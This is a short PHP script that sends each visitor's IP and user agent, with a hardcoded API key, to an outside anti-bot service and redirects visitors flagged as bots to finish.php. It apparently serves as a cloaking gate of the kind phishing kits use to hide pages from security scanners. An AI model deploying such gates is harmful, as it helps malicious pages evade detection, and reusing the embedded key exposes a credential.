<?php
function validateBot($ip, $userAgent, $apiKey) {
    $url = 'https://antibot.pw/api/v2-blockers?ip=' . urlencode($ip) . '&apikey=' . urlencode($apiKey) . '&ua=' . urlencode($userAgent);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);

    curl_close($ch);
    $responseData = json_decode($response, true);

    if ($responseData && isset($responseData['is_bot'])) {
        return $responseData['is_bot'];
    } else {
        return false;
    }
}

$apiKey = '3617dc46dcf4635ed22eccfefd434031'; // acc 1

$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

$isBot = validateBot($ip, $userAgent, $apiKey);

if ($isBot) {
    header("HTTP/1.1 403 Forbidden");
    header('Location: finish.php');
}
?>